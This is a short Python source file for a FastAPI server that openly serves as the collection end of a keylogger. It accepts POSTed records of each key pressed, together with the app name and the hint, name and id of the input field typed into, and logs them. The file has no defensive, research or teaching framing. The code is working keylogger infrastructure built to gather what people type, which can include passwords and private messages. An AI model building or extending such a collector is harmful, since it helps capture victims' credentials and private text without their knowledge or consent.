# main.py - FastAPI server
from typing import Dict

from fastapi import FastAPI, HTTPException,Request
from pydantic import BaseModel

app = FastAPI()

class KeystrokeData(BaseModel):
    session_id: str
    key: str
    app_name: str
    app_id: str
    field_hint: str
    field_name: str
    field_id: int

@app.post("/keyogger")
async def log_keystroke(data:Dict):
    # In a real application, you would store this in a database
    recv_data = {}
    recv_data['session_id'] = data.get('session_id')
    recv_data['key'] = data.get('key')
    recv_data['app_name'] = data.get('app_name')
    recv_data['app_id'] = data.get('app_id')
    recv_data['field_hint'] = data.get('field_hint')
    recv_data['field_name'] = data.get('field_name')
    recv_data['field_id'] = data.get('field_id')

    print(f"Received keystroke data: {recv_data}")
    return {"status": "success", "message": "Keystroke logged"}

@app.get("/")
async def root():
    return {"message": "Keylogger Server is running"}

if __name__ == "__main__":

    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=3000,reload=True,workers=1)
